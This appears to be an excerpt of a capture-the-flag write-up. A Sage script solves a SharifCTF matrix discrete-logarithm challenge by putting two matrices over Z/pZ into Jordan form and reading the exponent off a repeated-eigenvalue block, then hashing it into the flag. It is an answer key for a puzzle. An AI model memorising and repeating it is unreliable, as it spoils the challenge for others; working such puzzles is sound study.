&lt;p&gt;In our case \(G[3][3]\) to \(G[4][4]\) is a Jordan block with repeated eigenvalues, and all arithmetic operations are in Quotient Ring \(Z/Z_p\)&lt;/p&gt;
&lt;p&gt;this is my code in sage (&lt;a href=&#34;ElGamat.sage&#34; target=&#34;_blank&#34;&gt;ElGamat.sage&lt;/a&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import hashlib
p = 1461501637330902918203684832716283019655932542983
G = [
[1287397632974625907369332145667695136576732725719, 999149001044306271168727399637009399486427921379, 1046504160269652701583906344218556291030141088947, 724446625683754938181565321149725788430461092168, 1071845980147173642753960259602135592110139561915],
[947603660931904341080240982051313712707367037453, 312289846563741934103580532543082761760226637905, 494739786803547247505263837170488583876166831850, 680540462980071181450018491798299105995449257198, 2602258415762368797405060707505977243346704576],
[996213673531855992829525358578006610606634622631, 1025711294257038288640877971869685565227647136954, 1432432135773706484846126533752827108541355741973, 1238541870126055576875033883691918425137600727481, 1130938956963588695293783764965618873887596017827],
[1320933266015680090206505704792362493057963931979, 1151746112645644166669332171392580649376526147475, 117512451110908867093773368598681106589771485221, 78071463743800894350883457304401524272336187149, 350437511649326676405126284689545814008237687775],
[438339253001275654203062260777687750937184662400, 372483950165136927369598298270629892810999203086, 859008773869616460027135965589262417694174453098, 1174526536643808668299968641952541506024584582818, 13201859260259503932772826643483081858286638179]
]
H = [
[903022231855038558383593109888227525558007552960, 565977275270298825053282757799743346899236483368, 989303675765663596792169321947495382568831693037, 601579288654704389384765634776493921679315260303, 913791750749394879333717884106841876340654737006],
[1159121456278955861257379214176694847802842944213, 55304385436577133507085707981392660143782780650, 559867756424853909301288957105188829240808301823, 1230859641388132364539374469026906952870988170695, 1423995124592695628047882256427827379994877406997],
[1125565199147204322161069021173152827232960621114, 1373772036013472137002755957284397215018630262515, 640623873603434273377865546046279663852895430999, 1056809237992218798189986002766547616222871640976, 1426649441470162608512662468308504390861950649943],
[303729376872199895471546635639837180361513146712, 1163767872227950278851006729914569662442255257700, 1320342731346163804219021270875175061467772367004, 433001013681018647747911760920686992297849343282, 1149024280460224794070159244078925721991430685838],
[23661702916810298505759145354543089608241235601, 1048655828654821525617176122368805879408325508567, 587846047820504813842423941849757078103027466928, 1338365929525105225695097114139069216753339875455, 1425543850003062038868121400064269552725872690214]
]
R = IntegerModRing(p)
M = MatrixSpace(R, 5, 5)
g = M(G)
h = M(H)
g, p_mat = g.jordan_form(transformation=True)
print &#39;[+] jordan normal for G:&#39;
for i in g:
print i
h = p_mat.inverse()*h*p_mat
print &#39;[+] jordan normal for H:&#39;
for i in h:
print i
a11 = g[3][3]
b11 = h[3][3]
b12 = h[3][4]
x = a11*b12/b11
assert b12 == x*a11^(x-1)
print &#39;[+] solution:&#39;, x
def flag_gen(alpha):
return &#39;SharifCTF{%s}&#39; % hashlib.md5(str(alpha).encode()).hexdigest()
print &#39;[+] FLAG:&#39;, flag_gen(x)
&lt;/code&gt;&lt;/pre&gt;</description></item></channel></rss>